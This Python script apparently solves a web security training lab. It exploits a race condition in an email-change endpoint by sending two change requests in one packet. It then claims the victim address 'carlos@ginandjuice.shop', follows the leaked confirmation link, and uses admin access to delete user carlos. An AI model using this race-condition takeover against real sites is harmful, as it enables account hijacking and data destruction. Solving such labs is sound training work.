from web_security_academy.core.email_client import EmailClient
from web_security_academy.core.logger import logger

from urllib.parse import urljoin
from bs4 import BeautifulSoup
from requests import Request


def solve_lab(session):
    session.login("wiener", "peter")
    email_client = EmailClient(session)
    csrf = session.get_csrf_token("/my-account")

    prepped = []
    change_email_url = urljoin(session.url, "/my-account/change-email")
    logger.info('Attempting to associate "carlos@ginandjuice.shop" with account...')
    for email in (email_client.address, "carlos@ginandjuice.shop"):
        data = {"email": email, "csrf": csrf}
        req = Request("POST", change_email_url, data=data)
        prepped.append(session.prepare_request(req))

    session.single_packet_send(*prepped)
    logger.info('Simultanenously sent "Update email" requests for:')
    logger.info(f" - {email_client.address}")
    logger.info(" - carlos@ginandjuice.shop")

    email_client.update_emails()
    body = email_client.emails[-1]["Body"].select_one(".dirty-body").get("data-dirty")
    if "carlos@ginandjuice.shop" not in body:
        logger.failure("Race condition exploit failed. Try running the script again")
        return
    else:
        logger.success("Race condition exploit succeeded! Updating email...")
        href = BeautifulSoup(body, "lxml").select_one("a").get("href")
        session.get(href)

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
